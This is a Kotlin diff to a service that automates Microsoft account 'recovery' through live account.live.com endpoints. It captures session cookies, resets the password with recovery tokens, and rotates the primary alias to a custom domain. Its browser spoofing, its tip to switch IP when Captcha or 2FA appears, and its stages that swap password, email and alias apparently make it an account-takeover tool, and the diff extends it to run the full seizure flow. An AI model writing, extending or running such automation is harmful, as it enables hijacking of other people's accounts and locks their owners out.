@@ -70,7 +70,7 @@ class RecoveryService(
     private val stageDelayMs: Long = 1000L,
     private val accountRepository: AccountRepository? = null,
     private val aliasClient: AliasClient? = null,
-    private val stopAfterStage7: Boolean = true,
+    private val stopAfterStage7: Boolean = false,
 ) : AutoCloseable {
 
     private val logger = LoggerFactory.getLogger(RecoveryService::class.java)
@@ -85,6 +85,7 @@ class RecoveryService(
         newPassword: String? = null,
         newEmail: String? = null,
         stageListener: StageListener? = null,
+        aliasOtcProvider: (suspend (String) -> String)? = null,
     ): RecoveryResult {
         if (email.isBlank()) {
             return RecoveryResult.Failure(RecoveryStage.CREDENTIAL_DISCOVERY, "Email cannot be blank")
@@ -119,6 +120,7 @@ class RecoveryService(
                 newPassword = targetPassword,
                 newEmail = effectiveNewEmail,
                 stageListener = stageListener,
+                aliasOtcProvider = aliasOtcProvider,
             )
         } catch (e: CancellationException) {
             throw e
@@ -147,6 +149,7 @@ class RecoveryService(
         newPassword: String,
         newEmail: String,
         stageListener: StageListener? = null,
+        aliasOtcProvider: (suspend (String) -> String)? = null,
     ): RecoveryResult {
         var uaid = RecoveryParsers.generateUaid()
 
@@ -223,7 +226,15 @@ class RecoveryService(
         } else {
             if (stageDelayMs > 0) delay(stageDelayMs)
 
-            val stage8Result = executeStage8(client, email, newEmail, uaid, activeCanary, stageListener)
+            val stage8Result = executeStage8(
+                client = client,
+                email = email,
+                newEmail = newEmail,
+                uaid = uaid,
+                canary = activeCanary,
+                stageListener = stageListener,
+                aliasOtcProvider = aliasOtcProvider,
+            )
             if (stage8Result is StageExecution.Failure) return stage8Result.result
             val (rotatedAliasEmail, canaryAfter8) = (stage8Result as StageExecution.Success).value
             targetAliasEmail = rotatedAliasEmail
@@ -509,10 +520,11 @@ class RecoveryService(
                 }
             }
 
+            val initialUrl = polishResponse.request.url.toString().ifBlank { stabilizationUrl }
             val responseBodyString = polishResponse.bodyAsText()
-            val parsedDoc = Jsoup.parse(responseBodyString)
+            val parsedDoc = Jsoup.parse(responseBodyString, initialUrl)
             val htmlTitle = parsedDoc.title()
-            val hasPpft = responseBodyString.contains("name=\"PPFT\"")
+            val hasPpftInitial = responseBodyString.contains("name=\"PPFT\"")
             val htmlSnippet = responseBodyString.take(500).replace("\r", "").replace("\n", " ")
 
             logger.info("=== STAGE 3 DEBUG ===")
@@ -520,113 +532,124 @@ class RecoveryService(
             logger.info("Location Header: {}", polishResponse.headers[HttpHeaders.Location] ?: "none")
             logger.info("HTML Length: {}", responseBodyString.length)
             logger.info("HTML Title: {}", htmlTitle)
-            if (hasPpft) {
+            if (hasPpftInitial) {
                 logger.warn("CRITICAL: Response contains PPFT. Microsoft is asking to log in again.")
             }
             logger.info("HTML Snippet: {}", htmlSnippet)
 
             val debugLogDetail = """
 Status: `${polishResponse.status}` | Title: `$htmlTitle` | Length: `${responseBodyString.length}`
-Location: `${polishResponse.headers[HttpHeaders.Location] ?: "none"}` | PPFT: `$hasPpft`
+Location: `${polishResponse.headers[HttpHeaders.Location] ?: "none"}` | PPFT: `$hasPpftInitial`
 ```html
 $htmlSnippet
 ```
 """.trimIndent()
             stageListener?.invoke("3-debug", "Stage 3 Debug Dump", true, debugLogDetail)
 
-            var tokenT = parsedDoc.selectFirst("input[name=t]")?.attr("value")
-            if (tokenT.isNullOrEmpty()) {
-                val match = Regex("""name=["']t["']\s+value=["']([^"']+)["']""").find(responseBodyString)
-                    ?: Regex("""value=["']([^"']+)["']\s+name=["']t["']""").find(responseBodyString)
-                    ?: Regex("""["']t["']\s*:\s*["']([^"']+)["']""").find(responseBodyString)
-                tokenT = match?.groupValues?.get(1)
-            }
+            var currentHtml = responseBodyString
+            var currentUrl = initialUrl
+            var currentDoc = parsedDoc
+            var submittedAddProofViaForm = false
+            var hops = 0
 
-            if (tokenT.isNullOrBlank()) {
-                val bodyText = parsedDoc.body().text()
-                logger.error("Stage 3 Failed. Microsoft Interstitial Text: {}", bodyText.take(500))
-
-                if (bodyText.contains("Protect", ignoreCase = true) || bodyText.contains("Verify", ignoreCase = true)) {
-                    val msg = "Microsoft requested additional identity verification (Captcha/2FA). Try again later or use a different IP."
-                    stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
-                    StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
-                } else if (hasPpft) {
-                    val msg = "Session expired or invalid, asked to login again."
-                    stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail")
-                    StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+            while (hops < 2) {
+                val hasDoSubmit = currentHtml.contains("DoSubmit()", ignoreCase = true) ||
+                    currentDoc.selectFirst("body[onload*=DoSubmit]") != null
+                val autoSubmitForm = if (hasDoSubmit) {
+                    currentDoc.selectFirst("form[name=fmHF], form#fmHF, form")
                 } else {
-                    val msg = "Token t not found in HTML."
-                    stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
-                    StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    null
                 }
-            } else {
-                val noRedirectPostClient = if (clientEngine != null) {
-                    HttpClient(clientEngine) {
-                        followRedirects = false
-                        install(HttpCookies) {
-                            storage = cookieStorage
-                        }
+                val actionUrl = autoSubmitForm?.absUrl("action")?.ifBlank { autoSubmitForm.attr("action").trim() }.orEmpty()
+                val hiddenFields = autoSubmitForm?.select("input[type=hidden]")
+                    ?.mapNotNull { input ->
+                        val name = input.attr("name").trim()
+                        if (name.isNotEmpty()) name to input.attr("value") else null
                     }
-                } else {
-                    HttpClient(OkHttp.create()) {
-                        followRedirects = false
-                        install(HttpCookies) {
-                            storage = cookieStorage
-                        }
-                    }
+                    .orEmpty()
+
+                if (!hasDoSubmit ||
+                    actionUrl.isBlank() ||
+                    (!actionUrl.startsWith("https://") && !actionUrl.startsWith("http://")) ||
+                    hiddenFields.isEmpty()
+                ) {
+                    break
                 }
 
-                val addProofResponse = noRedirectPostClient.use {
-                    it.submitForm(
-                        url = "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
-                        formParameters = parameters { append("t", tokenT) },
-                    ) {
-                        header(
-                            HttpHeaders.UserAgent,
-                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-                        )
-                        header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
-                    }
-                }
-
+                hops++
                 logger.info(
-                    "Stage 3 POST /proofs/Add status={}, location={}",
-                    addProofResponse.status,
-                    addProofResponse.headers[HttpHeaders.Location] ?: "none",
+                    "Stage 3 detected DoSubmit() auto-submit form (hop={}): action={}, fieldNames={}",
+                    hops,
+                    actionUrl,
+                    hiddenFields.joinToString(",") { it.first },
                 )
 
-                val existingAccountCookies = cookieStorage.get(Url("https://account.live.com"))
-                val setCookieHeaders = addProofResponse.headers.getAll(HttpHeaders.SetCookie).orEmpty()
-                for (rawCookie in setCookieHeaders) {
-                    if (rawCookie.contains("AMRPSSecAuth=") && existingAccountCookies.none { it.name == "AMRPSSecAuth" }) {
-                        val value = rawCookie.substringAfter("AMRPSSecAuth=").substringBefore(";")
-                        cookieStorage.addCookie(
-                            Url("https://account.live.com"),
-                            Cookie(name = "AMRPSSecAuth", value = value, domain = "account.live.com", path = "/", secure = true),
-                        )
+                if (actionUrl.contains("/proofs/Add", ignoreCase = true)) {
+                    val addProofResponse = submitStage3AddProofForm(actionUrl, hiddenFields, cookieStorage)
+                    if (captureStage3AccountCookies(addProofResponse, cookieStorage)) {
+                        submittedAddProofViaForm = true
+                        break
                     }
-                    if (rawCookie.contains("amsc=") && existingAccountCookies.none { it.name == "amsc" }) {
-                        val value = rawCookie.substringAfter("amsc=").substringBefore(";")
-                        cookieStorage.addCookie(
-                            Url("https://account.live.com"),
-                            Cookie(name = "amsc", value = value, domain = "account.live.com", path = "/", secure = true),
-                        )
+                    currentHtml = addProofResponse.bodyAsText()
+                    currentUrl = actionUrl
+                    currentDoc = Jsoup.parse(currentHtml, currentUrl)
+                } else {
+                    val intermediateResponse = submitStage3IntermediateForm(actionUrl, hiddenFields, cleanCookieHeader)
+                    if (captureStage3AccountCookies(intermediateResponse, cookieStorage)) {
+                        submittedAddProofViaForm = true
+                        break
                     }
+                    currentHtml = intermediateResponse.bodyAsText()
+                    currentUrl = intermediateResponse.request.url.toString().ifBlank { actionUrl }
+                    currentDoc = Jsoup.parse(currentHtml, currentUrl)
+                }
+            }
+
+            if (submittedAddProofViaForm) {
+                stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
+                StageExecution.Success(Unit)
+            } else {
+                val hasPpft = currentHtml.contains("name=\"PPFT\"")
+                var tokenT = currentDoc.selectFirst("input[name=t]")?.attr("value")
+                if (tokenT.isNullOrEmpty()) {
+                    val match = Regex("""name=["']t["']\s+value=["']([^"']+)["']""").find(currentHtml)
+                        ?: Regex("""value=["']([^"']+)["']\s+name=["']t["']""").find(currentHtml)
+                        ?: Regex("""["']t["']\s*:\s*["']([^"']+)["']""").find(currentHtml)
+                    tokenT = match?.groupValues?.get(1)
                 }
 
-                val accountCookies = cookieStorage.get(Url("https://account.live.com"))
-                val hasAmrp = accountCookies.any { it.name == "AMRPSSecAuth" }
-                    || setCookieHeaders.any { it.contains("AMRPSSecAuth") }
-                val hasAmsc = accountCookies.any { it.name == "amsc" }
-                    || setCookieHeaders.any { it.contains("amsc") }
+                if (tokenT.isNullOrBlank()) {
+                    val bodyText = currentDoc.body().text()
+                    logger.error("Stage 3 Failed. Microsoft Interstitial Text: {}", bodyText.take(500))
 
-                if (!hasAmrp || !hasAmsc) {
-                    val msg = "Missing AMRPSSecAuth or amsc cookies after session stabilization"
-                    stageListener?.invoke("3", "Session Polish", false, msg)
-                    StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    if (bodyText.contains("Protect", ignoreCase = true) || bodyText.contains("Verify", ignoreCase = true)) {
+                        val msg = "Microsoft requested additional identity verification (Captcha/2FA). Try again later or use a different IP."
+                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
+                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    } else if (hasPpft) {
+                        val msg = "Session expired or invalid, asked to login again."
+                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail")
+                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    } else {
+                        val msg = "Token t not found in HTML."
+                        stageListener?.invoke("3", "Session Polish", false, "$msg\n$debugLogDetail\nText: ${bodyText.take(300)}")
+                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    }
                 } else {
-                    stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
-                    StageExecution.Success(Unit)
+                    val addProofResponse = submitStage3AddProofForm(
+                        actionUrl = "https://account.live.com/proofs/Add?apt=2&wa=wsignin1.0",
+                        formFields = listOf("t" to tokenT),
+                        cookieStorage = cookieStorage,
+                    )
+
+                    if (!captureStage3AccountCookies(addProofResponse, cookieStorage)) {
+                        val msg = "Missing AMRPSSecAuth or amsc cookies after session stabilization"
+                        stageListener?.invoke("3", "Session Polish", false, msg)
+                        StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg))
+                    } else {
+                        stageListener?.invoke("3", "Session Polish", true, "AMRPSSecAuth received")
+                        StageExecution.Success(Unit)
+                    }
                 }
             }
         }
@@ -636,6 +659,124 @@ $htmlSnippet
         val msg = "Network timeout or Microsoft rate limit hit: ${e.message}"
         stageListener?.invoke("3", "Session Polish", false, msg)
         StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.SESSION_POLISH, msg, cause = e))
+    }
+
+    private suspend fun submitStage3AddProofForm(
+        actionUrl: String,
+        formFields: List<Pair<String, String>>,
+        cookieStorage: CookiesStorage,
+    ): io.ktor.client.statement.HttpResponse {
+        val noRedirectPostClient = if (clientEngine != null) {
+            HttpClient(clientEngine) {
+                followRedirects = false
+                install(HttpCookies) {
+                    storage = cookieStorage
+                }
+            }
+        } else {
+            HttpClient(OkHttp.create()) {
+                followRedirects = false
+                install(HttpCookies) {
+                    storage = cookieStorage
+                }
+            }
+        }
+
+        return noRedirectPostClient.use {
+            val response = it.submitForm(
+                url = actionUrl,
+                formParameters = parameters {
+                    for ((key, value) in formFields) {
+                        append(key, value)
+                    }
+                },
+            ) {
+                header(
+                    HttpHeaders.UserAgent,
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                )
+                header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
+            }
+            logger.info(
+                "Stage 3 POST /proofs/Add status={}, location={}",
+                response.status,
+                response.headers[HttpHeaders.Location] ?: "none",
+            )
+            response
+        }
+    }
+
+    private suspend fun submitStage3IntermediateForm(
+        actionUrl: String,
+        formFields: List<Pair<String, String>>,
+        cleanCookieHeader: String,
+    ): io.ktor.client.statement.HttpResponse {
+        val intermediateClient = if (clientEngine != null) {
+            HttpClient(clientEngine) {
+                followRedirects = true
+                install(HttpRedirect) { checkHttpMethod = false }
+            }
+        } else {
+            HttpClient(OkHttp.create()) {
+                followRedirects = true
+                install(HttpRedirect) { checkHttpMethod = false }
+            }
+        }
+
+        return intermediateClient.use {
+            val response = it.submitForm(
+                url = actionUrl,
+                formParameters = parameters {
+                    for ((key, value) in formFields) {
+                        append(key, value)
+                    }
+                },
+            ) {
+                header(HttpHeaders.Cookie, cleanCookieHeader)
+                header(
+                    HttpHeaders.UserAgent,
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                )
+                header(HttpHeaders.AcceptLanguage, "en-US,en;q=0.9")
+            }
+            logger.info(
+                "Stage 3 POST intermediate status={}, location={}",
+                response.status,
+                response.headers[HttpHeaders.Location] ?: "none",
+            )
+            response
+        }
+    }
+
+    private suspend fun captureStage3AccountCookies(
+        response: io.ktor.client.statement.HttpResponse,
+        cookieStorage: CookiesStorage,
+    ): Boolean {
+        val existingAccountCookies = cookieStorage.get(Url("https://account.live.com"))
+        val setCookieHeaders = response.headers.getAll(HttpHeaders.SetCookie).orEmpty()
+        for (rawCookie in setCookieHeaders) {
+            if (rawCookie.contains("AMRPSSecAuth=") && existingAccountCookies.none { it.name == "AMRPSSecAuth" }) {
+                val value = rawCookie.substringAfter("AMRPSSecAuth=").substringBefore(";")
+                cookieStorage.addCookie(
+                    Url("https://account.live.com"),
+                    Cookie(name = "AMRPSSecAuth", value = value, domain = "account.live.com", path = "/", secure = true),
+                )
+            }
+            if (rawCookie.contains("amsc=") && existingAccountCookies.none { it.name == "amsc" }) {
+                val value = rawCookie.substringAfter("amsc=").substringBefore(";")
+                cookieStorage.addCookie(
+                    Url("https://account.live.com"),
+                    Cookie(name = "amsc", value = value, domain = "account.live.com", path = "/", secure = true),
+                )
+            }
+        }
+
+        val accountCookies = cookieStorage.get(Url("https://account.live.com"))
+        val hasAmrp = accountCookies.any { it.name == "AMRPSSecAuth" } ||
+            setCookieHeaders.any { it.contains("AMRPSSecAuth") }
+        val hasAmsc = accountCookies.any { it.name == "amsc" } ||
+            setCookieHeaders.any { it.contains("amsc") }
+        return hasAmrp && hasAmsc
     }
 
     private suspend fun executeStage4(
@@ -735,9 +876,24 @@ Text: $bodyText
         }
     }
 
+    private fun JsonObject?.firstNonBlankString(vararg keys: String): String? {
+        if (this == null) return null
+        for (key in keys) {
+            val value = runCatching { this[key]?.jsonPrimitive?.contentOrNull }.getOrNull()
+            if (!value.isNullOrBlank()) return value
+        }
+        return null
+    }
+
     private fun extractErrorDetails(rawJson: JsonObject?, typedError: microsoft.recovery.model.RecoveryErrorData?): Pair<String?, String?>? {
         if (typedError != null) {
-            return Pair(typedError.code, typedError.message ?: typedError.code)
+            val baseMsg = typedError.message?.takeIf { it.isNotBlank() } ?: typedError.code
+            val fullMsg = if (!typedError.data.isNullOrBlank()) {
+                listOfNotNull(baseMsg, "data=${typedError.data}").joinToString(" ")
+            } else {
+                baseMsg
+            }
+            return Pair(typedError.code, fullMsg)
         }
         val errorElement = rawJson?.get("error") ?: rawJson?.get("Error") ?: return null
         if (errorElement is JsonNull) return null
@@ -745,11 +901,14 @@ Text: $bodyText
             is JsonObject -> {
                 val code = errorElement["code"]?.jsonPrimitive?.contentOrNull
                     ?: errorElement["Code"]?.jsonPrimitive?.contentOrNull
-                val message = errorElement["message"]?.jsonPrimitive?.contentOrNull
+                val data = errorElement["data"]?.jsonPrimitive?.contentOrNull
+                    ?: errorElement["Data"]?.jsonPrimitive?.contentOrNull
+                val baseMessage = errorElement["message"]?.jsonPrimitive?.contentOrNull
                     ?: errorElement["Message"]?.jsonPrimitive?.contentOrNull
                     ?: code
                     ?: errorElement.toString()
-                Pair(code, message)
+                val fullMessage = if (!data.isNullOrBlank()) "$baseMessage data=$data" else baseMessage
+                Pair(code, fullMessage)
             }
             else -> Pair(null, runCatching { errorElement.jsonPrimitive.contentOrNull }.getOrNull() ?: errorElement.toString())
         }
@@ -772,21 +931,38 @@ Text: $bodyText
         val resetData = RecoveryParsers.extractResetPasswordData(resetHtml, MicrosoftHttpClientFactory.json)
             ?: run {
                 val msg = "Failed to extract sRecoveryToken or reset canary from reset password page"
+                logger.error(
+                    "Stage 6 ResetPassword extraction failed: status={}, finalUrl={}, length={}",
+                    resetPageResponse.status,
+                    resetPageResponse.request.url,
+                    resetHtml.length,
+                )
                 markPasswordRotationFailed(email, msg)
                 stageListener?.invoke("6", "Password Reset", false, msg)
                 return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
             }
 
+        logger.info(
+            "Stage 6 ResetPassword loaded: status={}, finalUrl={}, sRecoveryTokenLength={}, resetApiCanaryLength={}",
+            resetPageResponse.status,
+            resetPageResponse.request.url,
+            resetData.sRecoveryToken.length,
+            resetData.apiCanary.length,
+        )
+
+        val verifyCodeRequest = VerifyRecoveryCodeRequest(
+            publicKey = "2CBB3761027476727BDDBC9DE02870BE01ED793A",
+            recoveryCode = initialRecoveryCode,
+            code = initialRecoveryCode,
+            scid = 100103,
+            token = resetData.sRecoveryToken,
+            uiflvr = 1001,
+        )
+
         val verifyCodeResponse = client.post("https://account.live.com/API/Recovery/VerifyRecoveryCode") {
             contentType(ContentType.Application.Json)
             header("canary", resetData.apiCanary)
-            setBody(
-                VerifyRecoveryCodeRequest(
-                    recoveryCode = initialRecoveryCode,
-                    code = initialRecoveryCode,
-                    token = resetData.sRecoveryToken,
-                ),
-            )
+            setBody(verifyCodeRequest)
         }
 
         val verifyRaw = verifyCodeResponse.bodyAsText()
@@ -797,30 +973,68 @@ Text: $bodyText
             MicrosoftHttpClientFactory.json.parseToJsonElement(verifyRaw).jsonObject
         }.getOrNull()
         val verifyError = extractErrorDetails(verifyJson, verifyData?.error)
-        val verificationGrantToken = verifyData?.token
+        val verificationGrantToken = verifyData?.token?.takeIf { it.isNotBlank() }
+            ?: verifyJson.firstNonBlankString("token", "Token")
+
+        val canaryFromVerifyJson = verifyJson.firstNonBlankString("apiCanary", "canary", "sCanary")
+        val canaryAfterVerify = verifyData?.apiCanary?.takeIf { it.isNotBlank() }
+            ?: canaryFromVerifyJson
+            ?: run {
+                logger.warn("Stage 6 VerifyRecoveryCode did not return a new apiCanary; falling back to reset page apiCanary")
+                resetData.apiCanary
+            }
+
+        logger.info(
+            "Stage 6 VerifyRecoveryCode response: status={}, hasError={}, hasGrantToken={}, grantTokenLength={}, hasNewCanary={}",
+            verifyCodeResponse.status,
+            verifyError != null,
+            !verificationGrantToken.isNullOrBlank(),
+            verificationGrantToken?.length ?: 0,
+            verifyData?.apiCanary?.isNotBlank() == true || canaryFromVerifyJson != null,
+        )
 
         if (!verifyCodeResponse.status.isSuccess() || verifyError != null || verificationGrantToken.isNullOrBlank()) {
             val msg = "Failed to verify recovery code: ${verifyError?.second ?: "HTTP ${verifyCodeResponse.status.value} $verifyRaw"}"
+            logger.error("Stage 6 VerifyRecoveryCode failed: {}", verifyRaw.take(500))
             markPasswordRotationFailed(email, msg)
             stageListener?.invoke("6", "Password Reset", false, msg)
             return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, verifyError?.first))
         }
 
-        val canaryAfterVerify = verifyData.apiCanary?.takeIf { it.isNotBlank() } ?: resetData.apiCanary
-        val contactEmailForReset = email.ifBlank { newEmail }
+        if (verificationGrantToken == resetData.sRecoveryToken) {
+            val msg = "VerifyRecoveryCode returned sRecoveryToken instead of elevated grant token"
+            logger.error("Stage 6 VerifyRecoveryCode returned unchanged sRecoveryToken (len={})", verificationGrantToken.length)
+            markPasswordRotationFailed(email, msg)
+            stageListener?.invoke("6", "Password Reset", false, msg)
+            return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg))
+        }
+
+        val contactEmailForReset = newEmail.trim()
+            .takeIf { it.isNotBlank() && !it.equals(email.trim(), ignoreCase = true) }
+            ?: ""
+        val recoverRequest = RecoverUserRequest(
+            contactEmail = contactEmailForReset,
+            contactEpid = "",
+            password = newPassword,
+            passwordExpiryEnabled = 0,
+            publicKey = "2CBB3761027476727BDDBC9DE02870BE01ED793A",
+            token = verificationGrantToken,
+        )
+
+        logger.info(
+            "=== STAGE 6 RECOVERUSER DEBUG === tokenLength={}, sRecoveryTokenLength={}, contactEmail={}, apiCanary={}, canaryChangedFromReset={}, publicKey={}",
+            recoverRequest.token.length,
+            resetData.sRecoveryToken.length,
+            recoverRequest.contactEmail,
+            canaryAfterVerify,
+            canaryAfterVerify != resetData.apiCanary,
+            recoverRequest.publicKey,
+        )
 
         val recoverUserResponse = client.post("https://account.live.com/API/Recovery/RecoverUser") {
             contentType(ContentType.Application.Json)
             header("canary", canaryAfterVerify)
-            setBody(
-                RecoverUserRequest(
-                    contactEmail = contactEmailForReset,
-                    contactEpid = "",
-                    password = newPassword,
-                    passwordExpiryEnabled = 0,
-                    token = verificationGrantToken,
-                ),
-            )
+            setBody(recoverRequest)
         }
 
         val recoverRaw = recoverUserResponse.bodyAsText()
@@ -842,9 +1056,22 @@ Text: $bodyText
         )
 
         if (!recoverUserResponse.status.isSuccess() || recoverError != null || finalRecoveryCode.isNullOrBlank()) {
+            logger.error(
+                "Stage 6 RecoverUser failed: status={}, rawBody={}, sentTokenLen={}, contactEmail={}, apiCanary={}",
+                recoverUserResponse.status,
+                recoverRaw.take(800),
+                recoverRequest.token.length,
+                recoverRequest.contactEmail,
+                canaryAfterVerify,
+            )
             val msg = "Failed to recover user credentials: ${recoverError?.second ?: "HTTP ${recoverUserResponse.status.value} $recoverRaw"}"
             markPasswordRotationFailed(email, msg)
-            stageListener?.invoke("6", "Password Reset", false, msg)
+            stageListener?.invoke(
+                "6",
+                "Password Reset",
+                false,
+                "$msg\n[tokenLen=${recoverRequest.token.length}, sRecovLen=${resetData.sRecoveryToken.length}, contactEmail=${recoverRequest.contactEmail}, canaryLen=${canaryAfterVerify.length}, canaryChanged=${canaryAfterVerify != resetData.apiCanary}]",
+            )
             return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.PASSWORD_ROTATION, msg, recoverError?.first))
         }
 
@@ -923,6 +1150,7 @@ Text: $bodyText
         uaid: String,
         canary: String,
         stageListener: StageListener?,
+        aliasOtcProvider: (suspend (String) -> String)? = null,
     ): StageExecution<Pair<String, String>> {
         var activeCanary = canary
         val targetAliasEmail: String
@@ -935,15 +1163,17 @@ Text: $bodyText
                     oldEmail = email,
                     httpClient = client,
                     customAlias = if (newEmail.endsWith("@qhuyy.tech")) newEmail else null,
+                    aliasOtcProvider = aliasOtcProvider,
                 )
             }.getOrElse { e ->
+                if (e is CancellationException) throw e
                 val msg = e.message ?: "Custom domain alias rotation failed"
                 stageListener?.invoke("8", "Alias Rotation", false, msg)
                 return StageExecution.Failure(RecoveryResult.Failure(RecoveryStage.ALIAS_ROTATION, msg, cause = e))
             }
             targetAliasEmail = aliasResult.newEmail
             activeCanary = aliasResult.updatedCanary
-            stageListener?.invoke("8", "Alias Rotation", true, "New alias verified and set as primary")
+            stageListener?.invoke("8", "Alias Rotation", true, "Alias $targetAliasEmail verified and set as primary")
         } else {
             val newAliasPrefix = newEmail.substringBefore("@")
             targetAliasEmail = "$newAliasPrefix@outlook.com"
